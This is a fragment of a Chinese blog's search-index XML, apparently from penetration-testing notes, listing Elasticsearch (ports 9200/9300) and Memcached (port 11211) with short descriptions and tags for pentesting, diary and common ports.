<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elasticsearch：搜索和数据分析引擎</span><br><span class="line">端口9200/9300</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MemCache：自由、源码开放、高性能、分布式的分布式内存对象缓存系统</span><br><span class="line">端口11211</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>常见端口</tag>
      </tags>
  </entry>
</search>
